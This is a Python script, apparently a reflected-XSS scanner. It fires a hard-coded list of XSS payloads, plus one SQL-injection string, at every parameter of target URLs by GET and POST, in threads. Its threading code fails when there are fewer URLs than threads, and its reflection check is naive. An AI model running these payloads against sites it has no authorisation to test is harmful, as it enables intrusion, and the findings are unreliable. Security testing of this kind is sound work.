import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin
import json
import threading
import argparse

# Function to log results to a file
def log_result(log_file, message):
    with open(log_file, 'a') as f:
        f.write(message + "\n")

# Function to test XSS vulnerability on a single URL
def check_xss(url, params, payload, method="GET", headers=None, cookies=None, log_file="xss_log.txt"):
    try:
        if method.upper() == "GET":
            response = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=10)
        else:
            response = requests.post(url, data=params, headers=headers, cookies=cookies, timeout=10)

        # Parse the response content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Check if the payload is reflected in the response
        for key, value in params.items():
            if value in str(soup):
                result = f"[+] XSS vulnerability found at: {url} using {method} with payload: {payload} in parameter {key}"
                print(result)
                log_result(log_file, result)
            else:
                result = f"[-] No XSS vulnerability found at: {url} using {method} with payload: {payload} in parameter {key}"
                print(result)
                log_result(log_file, result)
    except requests.Timeout:
        print(f"[!] Timeout occurred for {url}")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

# Function to construct query params with payload for all parameters
def construct_params(params, payload):
    return {param: payload for param in params}

# Function to test XSS on multiple URLs from a list
def test_xss_multiple_urls(url_list, payloads, methods, headers=None, cookies=None, log_file="xss_log.txt"):
    for target in url_list:
        url = target['url']
        params = target['params']
        
        for payload in payloads:
            for method in methods:
                print(f"Testing {method} request on {url} with payload: {payload}")
                test_params = construct_params(params, payload)
                check_xss(url, test_params, payload, method=method, headers=headers, cookies=cookies, log_file=log_file)

# Function to load URLs and parameters from a JSON file
def load_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        return json.load(file)

# Function to run XSS tests in parallel using threading
def run_parallel_tests(url_list, payloads, methods, headers=None, cookies=None, log_file="xss_log.txt", num_threads=5):
    def worker(url_chunk):
        test_xss_multiple_urls(url_chunk, payloads, methods, headers, cookies, log_file)
    
    chunk_size = len(url_list) // num_threads
    threads = []

    for i in range(0, len(url_list), chunk_size):
        url_chunk = url_list[i:i+chunk_size]
        thread = threading.Thread(target=worker, args=(url_chunk,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Command-line interface using argparse
def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
    
    # Argument for scanning a single URL
    parser.add_argument('--url', type=str, help="URL to scan for XSS vulnerabilities")
    
    # Optional argument for file with multiple URLs
    parser.add_argument('--file', type=str, help="JSON file containing multiple URLs and parameters")
    
    # Optional argument for custom headers
    parser.add_argument('--headers', type=str, help="Custom headers in JSON format", default=None)
    
    # Optional argument for custom cookies
    parser.add_argument('--cookies', type=str, help="Custom cookies in JSON format", default=None)
    
    # Optional argument for custom log file
    parser.add_argument('--log', type=str, help="Log file to save results", default="xss_log.txt")
    
    args = parser.parse_args()

    # Define payloads
    payloads = [
        "<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"'><iframe src=javascript:alert(1)>",
        "javascript:alert(1)//",
        "<body onload=alert(1)>",
        "' OR '1'='1';--",
    ]

    # Request methods to test
    methods = ["GET", "POST"]

    # Parse custom headers and cookies if provided
    headers = json.loads(args.headers) if args.headers else {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    }
    
    cookies = json.loads(args.cookies) if args.cookies else {'session_id': '1234567890abcdef'}

    # If a file is provided, load the URLs from the file
    if args.file:
        url_list = load_urls_from_file(args.file)
        run_parallel_tests(url_list, payloads, methods, headers, cookies, log_file=args.log)
    
    # If a single URL is provided, scan that URL
    elif args.url:
        target = {
            "url": args.url,
            "params": {"q": ""}  # Modify the parameters as needed
        }
        test_xss_multiple_urls([target], payloads, methods, headers, cookies, log_file=args.log)

if __name__ == "__main__":
    main()
